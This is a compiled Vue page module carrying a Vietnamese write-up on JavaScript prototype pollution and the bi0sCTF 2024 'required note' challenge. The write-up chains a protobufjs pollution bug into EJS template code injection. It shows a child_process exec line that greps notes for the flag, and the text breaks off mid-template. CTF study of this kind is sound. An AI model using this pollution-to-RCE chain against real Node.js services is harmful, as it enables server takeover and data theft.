import { _ as _export_sfc, r as resolveComponent, c as createElementBlock, a as createStaticVNode, e as createBaseVNode, b as createVNode, f as createTextVNode, o as openBlock } from "./app-BJjiZhLy.js";
const _imports_0 = "/assets/prototype-pollution-bios-QzZf0BQi.png";
const _imports_1 = "/assets/prototype-pollution-bios-1-CfHHC5Cn.png";
const _imports_2 = "/assets/prototype-pollution-bios-2-BjPMotlW.png";
const _imports_3 = "/assets/prototype-pollution-bios-4-aGCIIYOm.png";
const _imports_4 = "/assets/prototype-pollution-bios-5-B5d8y9UL.png";
const _imports_5 = "/assets/prototype-pollution-bios-6-CkKX1tqA.png";
const _imports_6 = "/assets/prototype-pollution-bios-7-BKbyKvqi.png";
const _imports_7 = "/assets/prototype-pollution-bios-8-B9_18Fb9.png";
const _imports_8 = "/assets/prototype-pollution-bios-9-bjK5B5jb.png";
const _imports_9 = "/assets/prototype-pollution-bios-10-A0dv5veB.png";
const _imports_10 = "/assets/prototype-pollution-bios-11-DtvPFIpj.png";
const _imports_11 = "/assets/prototype-pollution-bios-12-XE0oKGlM.png";
const _imports_12 = "/assets/prototype-pollution-bios-13-CvP4z0ON.png";
const _imports_13 = "/assets/prototype-pollution-bios-14-LcnDDfyW.png";
const _imports_14 = "/assets/prototype-pollution-bios-15-DxnkYBoi.png";
const _imports_15 = "/assets/prototype-pollution-bios-16-BNhyS9ID.png";
const _imports_16 = "/assets/prototype-pollution-bios-17-CHn9GA99.png";
const _imports_17 = "/assets/prototype-pollution-bios-18-QMEJo5Gf.png";
const _sfc_main = {};
const _hoisted_1 = { class: "custom-container info" };
const _hoisted_2 = {
  href: "https://r3kapig-not1on.notion.site/bi0sCTF-2024-Jeopardy-2132609e35d74137935046fbcb62ff49",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_3 = {
  href: "https://www.npmjs.com/package/protobufjs",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_4 = {
  href: "https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_5 = {
  href: "https://github.com/mde/ejs/issues/735",
  target: "_blank",
  rel: "noopener noreferrer"
};
function _sfc_render(_ctx, _cache) {
  const _component_ExternalLinkIcon = resolveComponent("ExternalLinkIcon");
  return openBlock(), createElementBlock("div", null, [
    _cache[21] || (_cache[21] = createStaticVNode('<h2 id="object-trong-javascript" tabindex="-1"><a class="header-anchor" href="#object-trong-javascript"><span>Object trong JavaScript</span></a></h2><p>Object trong Javascript l√† m·ªôt ki·ªÉu d·ªØ li·ªáu ƒë·∫∑c bi·ªát trong javascript, bao g·ªìm c√°c key:value, g·ªçi l√† property. Value c·ªßa object c√≥ th·ªÉ l∆∞u ƒë∆∞·ª£c nhi·ªÅu ki·ªÉu d·ªØ li·ªáu, bao g·ªìm c·∫£ m·ªôt object kh√°c hay function. <img src="' + _imports_0 + '" alt="alt text"></p><p>C√≥ hai c√°ch th√¥ng th∆∞·ªùng ƒë·ªÉ truy c·∫≠p ƒë·∫øn c√°c property c·ªßa Object l√† Dot notation v√† Bracket Notation</p><ul><li><strong>Dot notation</strong>: object.properti</li><li><strong>Bracket notation</strong>: object[&quot;proerti&quot;]</li></ul><h3 id="object-prototypes" tabindex="-1"><a class="header-anchor" href="#object-prototypes"><span>Object Prototypes</span></a></h3><p>M·ªçi object trong JavaScript ƒë·ªÅu l√† instance c·ªßa <code>Object</code> n√™n ƒë·ªÅu ƒë∆∞·ª£c k·∫ø th·ª´a c√°c built-in property v√† method t·ª´ <code>Object.prototype</code>, g·ªçi l√† <strong>prototype</strong>. N√≥ l√† c∆° ch·∫ø c·ªßa Javascript Object ƒë·ªÉ k·∫ø th·ª´a c√°c t√≠nh nƒÉng c·ªßa nhau. V√≠ d·ª• nh∆∞ Object ·ªü tr√™n, d√π kh√¥ng ƒë∆∞·ª£c khai b√°o tr·ª±c ti·∫øp, nh∆∞ng v·∫´n c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c property v√† method nh∆∞ <code>constructor</code>, <code>toString()</code>, <code>valueOf()</code>,...</p><p>Ta c√≥ th·ªÉ truy c·∫≠p ƒë·∫øn prototype c·ªßa m·ªôt object th√¥ng qua property <code>__proto__</code> ho·∫∑c <code>Object.getPrototypeOf()</code></p><h3 id="protoype-chain" tabindex="-1"><a class="header-anchor" href="#protoype-chain"><span>Protoype chain</span></a></h3><p>Javascript tri·ªÉn khai vi·ªác k·∫ø th·ª´a d·ª±a v√†o Object, m·ªói Object ƒë·ªÅu c√≥ m·ªôt li√™n k·∫øt ƒë·∫øn nh·ªØng Object kh√°c. M·ªói prototype c√≥ th·ªÉ ch·ª©a prototype kh√°c, g·ªçi l√† <strong>prototype chain</strong>, n√≥ c√≥ th·ªÉ k·∫ø th·ª´a cho ƒë·∫øn final chain l√† null prototype.</p><p>Khi ch√∫ng ta truy c·∫≠p ƒë·∫øn m·ªôt property c·ªßa Object, tr∆∞·ªõc ti√™n s·∫Ω ki·ªÉm tra c√°c property hi·ªán c√≥ c·ªßa n√≥, n·∫øu kh√¥ng c√≥ n√≥ s·∫Ω t√¨m ki·∫øm ti·∫øp trong prototype c·ªßa n√≥, v√† c·ª© ti·∫øp t·ª•c nh∆∞ th·∫ø cho ƒë·∫øn khi t√¨m th·∫•y ho·∫∑c ƒë·∫øn null prototype.</p><p>Ta c√≥ ƒëo·∫°n code nh∆∞ sau, Object s·∫Ω set property object = &quot;Object&quot; cho prototype, sau ƒë√≥ t·∫°o th√™m m·ªôt object m·ªõi, c√≥ property <code>obj</code>. V√† bi·∫øn <code>test</code> t·ª´ Object <code>obj</code><img src="' + _imports_1 + '" alt="alt text"></p><p>Khi ta truy c·∫≠p <code>test.obj</code>, n√≥ s·∫Ω t√¨m c√°c property c·ªßa test, v√¨ kh√¥ng c√≥ n√™n n√≥ s·∫Ω t√¨m trong prototype c·ªßa test, v√† t√¨m th·∫•y property <code>obj</code> c·ªßa prototype l√† t·ª´ bi·∫øn <code>obj</code>, n√™n k·∫øt qu·∫£ s·∫Ω l√† &quot;Object&quot;. T∆∞∆°ng t·ª±, khi ta truy c·∫≠p <code>test.object</code>, n√≥ s·∫Ω t√¨m trong property c·ªßa test, sau ƒë√≥ ƒë·∫øn <code>obj</code>, cu·ªëi c√πng t√¨m trong Object prototype, v√† t√¨m th·∫•y property <code>object</code> l√† &quot;Object&quot;.</p><h2 id="prototype-pollution" tabindex="-1"><a class="header-anchor" href="#prototype-pollution"><span>Prototype Pollution</span></a></h2><h3 id="so-luoc" tabindex="-1"><a class="header-anchor" href="#so-luoc"><span>S∆° l∆∞·ª£c</span></a></h3><p>T·ª´ vi·ªác c√≥ th·ªÉ g·ªçi ƒë·∫øn prototype c·ªßa object, kh√¥ng ch·ªâ access ƒë·∫øn property c·ªßa prototype, ta c√≤n c√≥ th·ªÉ c·∫≠p nh·∫≠t d·ªØ li·ªáu c·ªßa prototype, nh∆∞ v·∫≠y th√¨ t·∫•t c·∫£ c√°c object kh√°c k·∫ø th·ª´a t·ª´ prototype ƒë√≥ s·∫Ω b·ªã ·∫£nh h∆∞·ªüng theo.</p><p><img src="' + _imports_2 + '" alt="alt text"></p><p>ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn Prototype Pollution, khi ta ch·ªânh s·ª≠a prototype c·ªßa Object, c√°c bi·∫øn kh√°c c≈©ng s·∫Ω b·ªã, d·∫´n t·ªõi vi·ªác khi truy c·∫≠p ƒë·∫øn m·ªôt property kh√¥ng t·ªìn t·∫°i trong object hi·ªán t·∫°i, n√≥ s·∫Ω t√¨m trong prototype v√† tr·∫£ v·ªÅ m·ªôt k·∫øt qu·∫£ kh√¥ng mong mu·ªën.</p><h3 id="nguyen-nhan" tabindex="-1"><a class="header-anchor" href="#nguyen-nhan"><span>Nguy√™n nh√¢n</span></a></h3><p>Nguy√™n nh√¢n th∆∞·ªùng ƒë·∫øn t·ª´ vi·ªác merge c√°c object theo ki·ªÉu ƒë·ªá quy v√† kh√¥ng ki·ªÉm tra k·ªπ c√†ng d·ªØ li·ªáu ƒë·∫ßu v√†o, ho·∫∑c t·ª´ vi·ªác parse d·ªØ li·ªáu t·ª´ ngu·ªìn kh√¥ng tin c·∫≠y.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">src<span class="token punctuation">,</span> dst</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> src <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> dst<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            <span class="token function">merge</span><span class="token punctuation">(</span>dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>\n<span class="line">            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token keyword">return</span> dst<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="challenge" tabindex="-1"><a class="header-anchor" href="#challenge"><span>Challenge:</span></a></h2><h3 id="bi0s-required-note" tabindex="-1"><a class="header-anchor" href="#bi0s-required-note"><span>bi0s/required note</span></a></h3>', 22)),
    createBaseVNode("div", _hoisted_1, [
      _cache[1] || (_cache[1] = createStaticVNode('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><p>Every CTF requires at least one overly complicated notes app.</p>', 3)),
      createBaseVNode("p", null, [
        createBaseVNode("a", _hoisted_2, [
          _cache[0] || (_cache[0] = createBaseVNode("code", null, "üìÅ required_note.zip", -1)),
          createVNode(_component_ExternalLinkIcon)
        ])
      ]),
      _cache[2] || (_cache[2] = createBaseVNode("blockquote", null, [
        createBaseVNode("p", null, "Author: Z_Pacifist")
      ], -1))
    ]),
    _cache[22] || (_cache[22] = createStaticVNode('<p><img src="' + _imports_3 + '" alt="alt text"></p><ul><li>Website cho ph√©p ta t·∫°o ra c√°c note v√† l∆∞u tr·ªØ. Ngo√†i ra th√¨ c√≥ th·ªÉ customise c√°c field v·ªõi protobuf <img src="' + _imports_4 + '" alt="alt text"></li><li>C√≥ m·ªôt note ch·ª©a flag ƒë∆∞·ª£c t·∫°o s·∫µn v·ªõi t√™n ƒë∆∞·ª£c generate t·ª´ h√†m <code>Math.random()</code> bao g·ªìm 16 k√≠ t·ª± [a-z0-9]</li></ul><h4 id="overview" tabindex="-1"><a class="header-anchor" href="#overview"><span>Overview</span></a></h4><p>Khi t√πy ch·ªânh settings, ta s·∫Ω g·ª≠i POST request ƒë·∫øn server <img src="' + _imports_5 + '" alt="alt text"> H√†m sau ƒë√≥ ƒë∆∞·ª£c x·ª≠ l√≠ nh∆∞ sau</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&quot;/customise&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">try</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">let</span> author <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;author&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">let</span> title <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">let</span> protoContents <span class="token operator">=</span> fs</span>\n<span class="line">      <span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">&quot;./settings.proto&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">      <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">      protoContents<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>author<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string author = 3 [default=&quot;user&quot;];</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>title<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">      protoContents<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string title = 1 [default=&quot;user&quot;];</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">&quot;./settings.proto&quot;</span><span class="token punctuation">,</span> protoContents<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">Message</span><span class="token operator">:</span> <span class="token string">&quot;Settings changed&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">Message</span><span class="token operator">:</span> <span class="token string">&quot;Internal server error&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>', 5)),
    createBaseVNode("p", null, [
      _cache[5] || (_cache[5] = createTextVNode("Server s·∫Ω l·∫•y ")),
      _cache[6] || (_cache[6] = createBaseVNode("code", null, "author", -1)),
      _cache[7] || (_cache[7] = createTextVNode(" v√† ")),
      _cache[8] || (_cache[8] = createBaseVNode("code", null, "title", -1)),
      _cache[9] || (_cache[9] = createTextVNode(" d·ª±a v√†o user input, ghi ƒë√® v√†o file ")),
      _cache[10] || (_cache[10] = createBaseVNode("code", null, "settings.proto", -1)),
      _cache[11] || (_cache[11] = createTextVNode(". Trong khi server s·∫Ω x·ª≠ l√≠ file protobuf th√¥ng qua th∆∞ vi·ªán ")),
      createBaseVNode("a", _hoisted_3, [
        _cache[3] || (_cache[3] = createTextVNode("protobufjs")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[12] || (_cache[12] = createTextVNode(" nh∆∞ng l·∫°i kh√¥ng s·ª≠ d·ª•ng latest version n√™n m√¨nh th·∫•y kh√° s√∫. ")),
      _cache[13] || (_cache[13] = createBaseVNode("img", {
        src: _imports_6,
        alt: "alt text"
      }, null, -1)),
      _cache[14] || (_cache[14] = createTextVNode(" Sau khi research th√¨ m√¨nh ph√°t hi·ªán ra c√≥ ")),
      createBaseVNode("a", _hoisted_4, [
        _cache[4] || (_cache[4] = createTextVNode("CVE")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[15] || (_cache[15] = createTextVNode(" c·ªßa version n√†y li√™n quan t·ªõi ")),
      _cache[16] || (_cache[16] = createBaseVNode("strong", null, "Prototype Pollution", -1)),
      _cache[17] || (_cache[17] = createTextVNode("."))
    ]),
    _cache[23] || (_cache[23] = createStaticVNode('<p>C·ª• th·ªÉ, POST payload l√™n <code>/customise</code> ƒë·ªÉ truy·ªÅn payload v√†o file <code>settings.protobuf</code>, sau khi t·∫°o m·ªôt note m·ªõi, server s·∫Ω parse t·ª´ file settings v√† b·ªã Prototype pollution. <img src="' + _imports_7 + '" alt="alt text"></p><p>Nh∆∞ v·∫≠y th√¨ ta c√≥ th·ªÉ t·∫≠n d·ª•ng Prototype Pollution ƒë·ªÉ khai th√°c b√†i n√†y.</p><h4 id="solution" tabindex="-1"><a class="header-anchor" href="#solution"><span>Solution</span></a></h4><h5 id="rce-voi-ejs" tabindex="-1"><a class="header-anchor" href="#rce-voi-ejs"><span>RCE v·ªõi EJS</span></a></h5>', 4)),
    createBaseVNode("p", null, [
      _cache[19] || (_cache[19] = createTextVNode("Ejs v3.1.9 c≈©ng c√≥ ")),
      createBaseVNode("a", _hoisted_5, [
        _cache[18] || (_cache[18] = createTextVNode("vuln SSTI")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[20] || (_cache[20] = createStaticVNode('. Ki·ªÉm tra th·ª≠ compile prototype th√¨ th·∫•y ƒëa s·ªë c√°c options ƒë·ªÅu c√≥ ƒë∆∞·ª£c <code>_JS_IDENTIFIER</code> test tr∆∞·ªõc khi x·ª≠ l√≠, tr·ª´ <code>escapeFn</code><img src="' + _imports_8 + '" alt="alt text"><code>escapeFn</code> l·∫°i ƒë∆∞·ª£c g√°n t·ª´ <code>opts.escapeFunction</code><img src="' + _imports_9 + '" alt="alt text"> V√¨ ƒëo·∫°n code ban ƒë·∫ßu kh√¥ng g√°n options <code>escapeFunction</code> n√™n ta c√≥ th·ªÉ ghi ƒë√® v√†o ƒë√¢y v·ªõi Prototype Pollution. <code>escapeFn</code> ch·ªâ ƒë∆∞·ª£c th√™m v√†o khi <code>opts.client</code> l√† truthy value. Ta ch·ªâ c·∫ßn t·∫≠n d·ª•ng v√† g√°n cho n√≥ gi√° tr·ªã true, escapeFn s·∫Ω ƒë∆∞·ª£c th√™m v√†o.', 16))
    ]),
    _cache[24] || (_cache[24] = createStaticVNode('<details class="custom-container details"><summary class="custom-container-title">eval</summary><p>D√≤ng 24 l√† d√≤ng ta th√™m v√†o cho <code>escapeFn</code> ƒë·ªÉ c√≥ th·ªÉ ch·∫°y code c·ªßa m√¨nh. <code>escapeFn</code> c·∫ßn c√≥ ki·ªÉu Function n√™n c√≥ th·ªÉ cho n√≥ b·∫±ng m·ªôt function b·∫•t k·ª≥ (<code>console.log</code>)</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">rethrow <span class="token operator">=</span> rethrow <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token function">rethrow</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> str<span class="token punctuation">,</span> flnm<span class="token punctuation">,</span> lineno<span class="token punctuation">,</span> esc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">var</span> lines <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">var</span> start <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lineno <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">var</span> end <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>lines<span class="token punctuation">.</span>length<span class="token punctuation">,</span> lineno <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">var</span> filename <span class="token operator">=</span> <span class="token function">esc</span><span class="token punctuation">(</span>flnm<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token comment">// Error context</span></span>\n<span class="line">  <span class="token keyword">var</span> context <span class="token operator">=</span> lines<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">line<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span><span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">var</span> curr <span class="token operator">=</span> i <span class="token operator">+</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">return</span> <span class="token punctuation">(</span>curr <span class="token operator">==</span> lineno <span class="token operator">?</span> <span class="token string">&#39; &gt;&gt; &#39;</span> <span class="token operator">:</span> <span class="token string">&#39;    &#39;</span><span class="token punctuation">)</span></span>\n<span class="line">      <span class="token operator">+</span> curr</span>\n<span class="line">      <span class="token operator">+</span> <span class="token string">&#39;| &#39;</span></span>\n<span class="line">      <span class="token operator">+</span> line<span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token comment">// Alter exception message</span></span>\n<span class="line">  err<span class="token punctuation">.</span>path <span class="token operator">=</span> filename<span class="token punctuation">;</span></span>\n<span class="line">  err<span class="token punctuation">.</span>message <span class="token operator">=</span> <span class="token punctuation">(</span>filename <span class="token operator">||</span> <span class="token string">&#39;ejs&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;:&#39;</span></span>\n<span class="line">    <span class="token operator">+</span> lineno <span class="token operator">+</span> <span class="token string">&#39;\\n&#39;</span></span>\n<span class="line">    <span class="token operator">+</span> context <span class="token operator">+</span> <span class="token string">&#39;\\n\\n&#39;</span></span>\n<span class="line">    <span class="token operator">+</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token keyword">throw</span> err<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">;</span></span>\n<span class="line">escapeFn <span class="token operator">=</span> escapeFn <span class="token operator">||</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;child_process&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&#39;tail -n +1 notes/* | grep bi0s &gt; notes/flag.json&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">var</span> __line <span class="token operator">=</span> <span class="token number">1</span></span>\n<span class="line">  <span class="token punctuation">,</span> __lines <span class="token operator">=</span> <span class="token string">&quot;&lt;!-- views/create.ejs --&gt;\\n&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n  &lt;title&gt;Create Note&lt;/title&gt;\\n  &lt;style&gt;\\n    body {\\n      background-color: #303030; /* Dark background color */\\n      color: #ffffff; /* Text color */\\n      font-family: &#39;Arial&#39;, sans-serif;\\n      display: flex;\\n      align-items: center;\\n      justify-content: center;\\n      height: 100vh;\\n      margin: 0;\\n    }\\n\\n    .card {\\n      background-color: #444444; /* Card background color */\\n      border-radius: 8px;\\n      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\\n      padding: 20px;\\n      width: 400px;\\n      box-sizing: border-box;\\n    }\\n\\n    h1, h2 {\\n      color: #ffffff; /* Heading text color */\\n      text-align: center;\\n    }\\n\\n    form {\\n      max-width: 100%;\\n      margin-top: 20px;\\n    }\\n\\n    label {\\n      color: #ffffff; /* Label text color */\\n    }\\n\\n    input[type=\\&quot;text\\&quot;], textarea {\\n      width: 100%;\\n      padding: 10px;\\n      margin: 8px 0;\\n      box-sizing: border-box;\\n      background-color: #333333; /* Input background color */\\n      color: #ffffff; /* Input text color */\\n      border: 1px solid #ffffff; /* Input border color */\\n    }\\n\\n    input[type=\\&quot;button\\&quot;] {\\n      background-color: #ffffff; /* Button background color */\\n      color: #303030; /* Button text color */\\n      padding: 10px 15px;\\n      border: none;\\n      cursor: pointer;\\n      width: 100%;\\n    }\\n\\n    input[type=\\&quot;button\\&quot;]:hover {\\n      background-color: #555555; /* Button background color on hover */\\n    }\\n\\n    #message {\\n      color: #ff0000; /* Error message color */\\n      margin-top: 10px;\\n      text-align: center;\\n    }\\n\\n    #noteList {\\n      list-style-type: none;\\n      padding: 0;\\n    }\\n\\n    #noteList li {\\n      margin-bottom: 8px;\\n    }\\n\\n    #noteList a {\\n      text-decoration: none;\\n      color: #ffffff; /* Link text color */\\n    }\\n\\n    #noteList a:hover {\\n      text-decoration: underline;\\n    }\\n  &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;div class=\\&quot;card\\&quot;&gt;\\n  &lt;h1&gt;Create a New Note&lt;/h1&gt;\\n  &lt;form id=\\&quot;noteForm\\&quot;&gt;\\n    &lt;label for=\\&quot;title\\&quot;&gt;Title:&lt;/label&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;text\\&quot; id=\\&quot;title\\&quot; name=\\&quot;title\\&quot; required&gt;&lt;br&gt;\\n    &lt;label for=\\&quot;content\\&quot;&gt;Content:&lt;/label&gt;&lt;br&gt;\\n    &lt;textarea id=\\&quot;content\\&quot; name=\\&quot;content\\&quot; rows=\\&quot;4\\&quot; cols=\\&quot;50\\&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;button\\&quot; value=\\&quot;Create Note\\&quot; onclick=\\&quot;submitNote()\\&quot;&gt;\\n  &lt;/form&gt;\\n\\n&lt;div id=\\&quot;message\\&quot; style=\\&quot;color: red;\\&quot;&gt;&lt;/div&gt;\\n\\n&lt;script&gt;\\nfunction addItemToList(item) {\\n  const noteList = document.getElementById(&#39;noteList&#39;);\\n  const listItem = document.createElement(&#39;li&#39;);\\n\\n  const link = document.createElement(&#39;a&#39;);\\n  link.href = `/view/${item.Noteid}`; \\n  link.textContent = item.Noteid; \\n  listItem.appendChild(link);\\n\\n  